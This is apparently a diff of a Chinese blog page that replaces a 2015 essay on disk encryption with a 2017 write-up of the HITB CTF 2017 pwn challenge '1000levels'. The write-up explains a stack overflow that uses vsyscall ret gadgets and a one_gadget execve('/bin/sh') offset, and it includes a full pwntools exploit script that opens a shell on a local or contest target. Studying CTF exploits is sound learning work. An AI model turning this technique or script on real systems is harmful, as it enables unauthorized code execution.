@@ -3,19 +3,22 @@
 <head>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
-  <title>对于硬盘事件的随想 | Hc1m1</title>
+  <title>HITB CTF 2017 Pwn题研究🙉 | Hc1m1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="瞎J*乱想">
-<meta name="keywords" content="随笔">
+  <meta name="description" content="上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..">
+<meta name="keywords" content="bin">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对于硬盘事件的随想">
-<meta property="og:url" content="http://0x48.pw/2015/07/19/0x02/index.html">
+<meta property="og:title" content="HITB CTF 2017 Pwn题研究🙉">
+<meta property="og:url" content="http://0x48.pw/2017/08/29/0x39/index.html">
 <meta property="og:site_name" content="Hc1m1">
-<meta property="og:description" content="瞎J*乱想">
-<meta property="og:updated_time" content="2017-07-26T03:37:07.000Z">
+<meta property="og:description" content="上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/hitb1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/hitb2.png">
+<meta property="og:updated_time" content="2017-08-30T11:47:46.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对于硬盘事件的随想">
-<meta name="twitter:description" content="瞎J*乱想">
+<meta name="twitter:title" content="HITB CTF 2017 Pwn题研究🙉">
+<meta name="twitter:description" content="上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/hitb1.png">
   
     <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
   
@@ -253,11 +256,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-0x02" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-0x39" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/07/19/0x02/" class="article-date">
-      <time datetime="2015-07-19T14:38:44.000Z" itemprop="datePublished">2015-07-19</time>
+      <a href="/2017/08/29/0x39/" class="article-date">
+      <time datetime="2017-08-29T11:11:04.000Z" itemprop="datePublished">2017-08-29</time>
 </a>
     </div>
   
@@ -270,7 +273,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      对于硬盘事件的随想
+      HITB CTF 2017 Pwn题研究🙉
     </h1>
   
 
@@ -281,7 +284,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -291,25 +294,61 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <blockquote>
-<p>瞎J*乱想</p>
-</blockquote>
+        <p>上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..</p>
 <a id="more"></a>
-<p>加密最初的目的就是让数据更安全，可是经过这次事件，我认为，加密本身就是一件不安全的事情</p>
-<hr>
-<p>加密的功能不是让别人无法读取我的信息，而是让不知道密码的人读取到信息，系统并不能检测你是否是本人，只能知道你输入的密码是否正确。</p>
-<p>  这就会导致一系列问题，比如，我把密码忘了，再比如，非法分子得到了我的密码。</p>
-<p>  还有就是会跟我这次一样，加大了我修复分区的难度，假如我的那个重要的分区没有使用LUKS加密，那么我的分区就能修复，我的数据就不会丢失了。</p>
-<hr>
-<p>所以，就出现了现在的机器学习，支付宝9.0也是这个理念，取消图案解锁，让支付宝app去学习用户的行为，去辨认用户。但是，现在网络上大部分都是在喷支付宝的这个理念，我觉得根本就是因为支付宝技术上还没达到，就把这个理念拿出来实施了。</p>
-<p>我认为支付宝技术上还没达到的原因，一，就是网络上很多人对支付宝的测试，支付宝9.0没法通过用户的行为识别用户，二，就是我觉得，如果支付宝真的达到能让app自己去识别用户的水平，那么就会把所有密码取消掉了（至少留个登录密码，甚至连登录密码也不需要。），而不是现在只取消了图案解锁。</p>
-<p>所以我认为，机器学习应该就是现在的主流。。</p>
-<hr>
-<p>但是我觉得机器学习还不够，我认为最好的方案就是人工智能，机器能像人一样思考，而不是分析海量的数据。</p>
-<p>就比如，你去见你爸，一眼你就可以知道他是不是你爸爸，而不是需要他说一串密码，然后你进行确认，也不用去分析他的各种行为来进行确认。</p>
-<p>而人工智能引发的什么人类危机就不属于我考虑的范围了，我估计人工智能要等到下一次革命，不知道我能不能看到。</p>
-<hr>
-<p>PS: 以上只是无聊时的突发奇想而已。。</p>
+<p>题目在我GitHub上有：🔞<a href="https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)</a></p>
+<h1 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h1><p>这题是一道栈溢出的题目，溢出点也很容易找到，但问题是开了EIP，当时的思路是想可能有啥骚操作可以让hint函数泄露出system地址……可惜一直想错了，最主要有一个知识点我不知道</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /proc/self/maps</span></div><div class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</div></pre></td></tr></table></figure>
+<p>以前从来没注意到过，linux下的每个程序都有一个这样的虚拟地址，而且不管开没开EIP，这段地址都是不变的。</p>
+<p>再开看看这段地址是啥指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/5i 0xffffffffff600000</div><div class="line">   0xffffffffff600000:	mov    rax,0x60</div><div class="line">   0xffffffffff600007:	syscall </div><div class="line">   0xffffffffff600009:	ret</div></pre></td></tr></table></figure>
+<p>就是一个不知道啥的系统调用然后ret，然后查了一些资料，这段地址是内核映射出来让程序调用内核一些功能的。而这段有用的指令就是一个ret，那么通过这个ret我们能进行怎样的骚操作？</p>
+<p>首先要先能理清楚栈结构，当我们的的流程是这样的时候：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main -&gt; hint -&gt; main -&gt; go -&gt; level</div></pre></td></tr></table></figure>
+<p>首先我们调用hint函数时，栈是这样的：</p>
+<p><img src="http://qn.lazysheep.cc/img/hitb1.png" alt="hitb1"></p>
+<p>然后在hint函数中并没有输出system的地址，但是却把system的地址放入了栈中</p>
+<p>执行完hint函数后，返回main函数，然后再调用go函数，这个时候栈是这样的：</p>
+<p><img src="http://qn.lazysheep.cc/img/hitb2.png" alt="hitb2"></p>
+<p>在hint函数中存放system地址的栈是在上图中变量v6的位置，在go函数中还调用了level函数，而溢出正好就是在level函数中，所以如果我们溢出构造一个栈地址如下所示</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">0xffffffffff600000</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0xffffffffff600000</td>
+</tr>
+<tr>
+<td style="text-align:center">0xffffffffff600000</td>
+</tr>
+<tr>
+<td style="text-align:center">v6(&amp;system)</td>
+</tr>
+</tbody>
+</table>
+<p>这样就能执行system函数了</p>
+<p>然后我们再来解决其他问题，v6是啥？会不会覆盖system，能执行system但是不能控制参数等问题。</p>
+<p>见如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">v2 = read_num();</div><div class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</div><div class="line">	v5 = v2;</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</div><div class="line">v3 = read_num();</div><div class="line">v6 = v5 + v3;</div></pre></td></tr></table></figure>
+<p>上面的代码是ida反编译go函数的代码，这部分要结合汇编看</p>
+<p>v5和v6的地址是一样的，所以如果输入的v2值大于0，则会把system的地址覆盖掉，这很好解决，输入负数和0都行，然后通过v3的输入，我们能在system地址的基础上进行加减。</p>
+<p>因为有libc，所以我们可以先获取system的符号地址为<code>0x45390</code></p>
+<p>然后使用<code>one_gadget</code>工具：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x4526a	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xcd0f3	execve("/bin/sh", rcx, r12)</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xcd1c8	execve("/bin/sh", rax, r12)</div><div class="line">constraints:</div><div class="line">  [rax] == NULL || rax == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xf0274	execve("/bin/sh", rsp+0x50, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x50] == NULL</div><div class="line"></div><div class="line">0xf1117	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xf66c0	execve("/bin/sh", rcx, [rbp-0xf8])</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</div></pre></td></tr></table></figure>
+<p>能获取到执行<code>execve(&#39;/bin/sh&#39;)</code>指令的地址，随便选一个和system地址相减得到差值，这个值就是v3，这样就把system的地址设置成执行<code>execve</code>的地址了，这样当rip跳到这里时就能直接执行系统命令了。</p>
+<p>但是还有一个小细节：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">999</span> )</div><div class="line">    &#123;</div><div class="line">      v7 = v6;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"More levels than before!"</span>);</div><div class="line">      v7 = <span class="number">1000L</span>L;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</div><div class="line">    v4 = time(<span class="number">0L</span>L);</div><div class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v7) != <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      v1 = time(<span class="number">0L</span>L);</div><div class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v8, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v7, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - v4), v3);</div><div class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p>因为<code>execve</code>的地址大于999，所以v7被设置为1000，所以level需要进行1000次递归</p>
+<p>第一种思路是写代码，自动答对所有题目，然后在最后一次递归的时候溢出</p>
+<p>还有因为溢出的长度有0x200，所以其实不必跑1000次</p>
+<p>如果没有答对题目，递归则会退出，就没法进行溢出了</p>
+<p>最后得到payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./1000levels'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">	context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</div><div class="line">	context.log_level = <span class="string">"debug"</span></div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">'47.74.147.103'</span>, <span class="number">20001</span>)</div><div class="line"></div><div class="line">libc_base = <span class="number">-0x45390</span></div><div class="line">one_gadget_base = <span class="number">0x4526a</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Question: '</span>) </div><div class="line">	tmp1 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.recvuntil(<span class="string">'* '</span>)</div><div class="line">	tmp2 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.sendline(str(tmp1 * tmp2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer2</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"Answer:"</span>)</div><div class="line">	p.sendline(<span class="string">"233"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">'How many levels?'</span>)</div><div class="line">p.sendline(<span class="string">'-1'</span>)</div><div class="line">p.recvuntil(<span class="string">'Any more?'</span>)</div><div class="line"></div><div class="line"><span class="comment"># p.sendline("2")</span></div><div class="line">p.sendline(str(libc_base+one_gadget_base))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>): </div><div class="line">	log.info(i)</div><div class="line">	ansewer()</div><div class="line">p.recvuntil(<span class="string">'Question: '</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line"></div><div class="line">p.send(<span class="string">'a'</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffff600000</span>) * <span class="number">3</span>) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>PS: 这题我没做出来，是看别人的Payload学习的，所以上面的Payload不是我自己写的.</p>
+<p>PSS: 因为有别的重要的事，所以另外一题堆的题目暂时没空更新，等有空了会更新上来的</p>
 
       
     </div>
@@ -318,13 +357,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2015/07/19/0x02/">对于硬盘事件的随想</a></p>
+        <p><span>本文标题:</span><a href="/2017/08/29/0x39/">HITB CTF 2017 Pwn题研究🙉</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
-        <p><span>发布时间:</span>2015-07-19, 22:38:44</p>
-        <p><span>最后更新:</span>2017-07-26, 11:37:07</p>
+        <p><span>发布时间:</span>2017-08-29, 19:11:04</p>
+        <p><span>最后更新:</span>2017-08-30, 19:47:46</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2015/07/19/0x02/" title="对于硬盘事件的随想">http://0x48.pw/2015/07/19/0x02/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2015/07/19/0x02/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/29/0x39/" title="HITB CTF 2017 Pwn题研究🙉">http://0x48.pw/2017/08/29/0x39/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/08/29/0x39/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -338,15 +377,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2015/07/22/0x04/">
-                    git小记
+                <a href="/2017/10/04/0x3A/">
+                    Pwnhub 2013的国庆 writeup
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2015/07/19/0x01/">
-                    对于这次硬盘坏掉事件小记
+                <a href="/2017/08/29/0x38/">
+                    Pwnhub之奇妙的巨蟒 Writeup
                 </a>
             </div>
         
@@ -357,7 +396,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1000levels"><span class="toc-number">1.</span> <span class="toc-text">1000levels</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -408,7 +447,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2015/07/22/0x04/" title="上一篇: git小记">
+            <a href="/2017/10/04/0x3A/" title="上一篇: Pwnhub 2013的国庆 writeup">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -416,7 +455,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2015/07/19/0x01/" title="下一篇: 对于这次硬盘坏掉事件小记">
+            <a href="/2017/08/29/0x38/" title="下一篇: Pwnhub之奇妙的巨蟒 Writeup">
                 <i class="fa fa-angle-right"></i>
             </a>
         
